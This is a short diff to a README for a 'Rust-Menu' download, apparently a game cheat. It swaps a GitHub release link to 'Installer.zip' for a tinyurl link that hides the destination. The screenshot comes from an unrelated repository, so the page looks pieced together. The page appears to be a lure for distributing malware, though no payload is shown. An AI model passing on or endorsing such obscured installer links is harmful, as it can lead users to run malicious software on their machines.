@@ -20,4 +20,4 @@
 ### Screenshots 📖 :
 ![изображение](https://github.com/Brunodias101/Auto-pecas/assets/78691311/a22f89ad-c055-4ddd-aa60-a0bd5dcac233)
 
-[📁Download Rust-Menu](https://github.com/ZXCSHEF/kya/releases/download/Downloader/Installer.zip)
+[📁Download Rust-Menu](https://tinyurl.com/mtpcrvw6)
